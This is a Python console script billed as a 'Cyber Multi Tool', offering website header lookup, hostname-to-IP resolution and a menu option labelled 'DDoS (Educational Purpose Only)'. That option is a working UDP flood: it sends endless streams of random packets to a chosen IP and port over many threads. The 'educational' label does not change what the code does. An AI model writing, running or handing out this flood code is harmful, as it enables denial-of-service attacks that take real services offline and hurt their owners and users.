# ================================================
#         CYBER MULTI TOOL - v1.0 (Console)
#     Developed by: Muhammad Shourov (Vampire)
#     Team: Vampire Squad
#     GitHub: https://github.com/vampiresquad
#     Date: April 2025
# ================================================

import os
import requests
from bs4 import BeautifulSoup
import socket
import threading
import time

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("="*50)
    print("            CYBER MULTI TOOL - v1.0")
    print("   Developed by: Muhammad Shourov (Vampire)")
    print("            Team: Vampire Squad")
    print("  GitHub: https://github.com/vampiresquad")
    print("="*50)
    print()

def info_gathering():
    site = input("Enter website URL (without https://): ")
    url = f"https://{site}"
    try:
        res = requests.get(url)
        soup = BeautifulSoup(res.text, 'html.parser')
        print("\n[+] Gathering Information...\n")
        print(f"[+] Website Title     : {soup.title.string if soup.title else 'N/A'}")
        print(f"[+] Server Header     : {res.headers.get('Server', 'N/A')}")
        print(f"[+] X-Powered-By      : {res.headers.get('X-Powered-By', 'N/A')}")
        print(f"[+] Status Code       : {res.status_code}")
    except Exception as e:
        print(f"[!] Error: {e}")

def ip_tracker():
    host = input("Enter hostname or website URL: ")
    try:
        ip = socket.gethostbyname(host)
        print(f"\n[+] IP Address of {host} is: {ip}")
    except Exception as e:
        print(f"[!] Error: {e}")

def ddos_attack():
    ip = input("Enter target IP: ")
    try:
        port = int(input("Enter target port: "))
        threads = int(input("Number of threads: "))
    except ValueError:
        print("[!] Invalid port or thread number!")
        return

    def attack():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_data = os.urandom(1024)
        while True:
            try:
                s.sendto(bytes_data, (ip, port))
                print(f"[+] Packet sent to {ip}:{port}")
            except Exception as e:
                print(f"[!] Error: {e}")
                break

    print("\n[+] DDoS Attack Starting (Educational Only)...\n")
    time.sleep(1)
    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

def main():
    while True:
        banner()
        print("1. Info Gathering")
        print("2. IP Tracker")
        print("3. DDoS (Educational Purpose Only)")
        print("4. Exit")

        choice = input("\nEnter your choice: ")
        if choice == "1":
            info_gathering()
        elif choice == "2":
            ip_tracker()
        elif choice == "3":
            ddos_attack()
        elif choice == "4":
            print("\n[!] Exiting... Stay ethical, stay safe!")
            break
        else:
            print("[!] Invalid choice! Try again.")

        input("\nPress Enter to return to menu...")

if __name__ == "__main__":
    main()
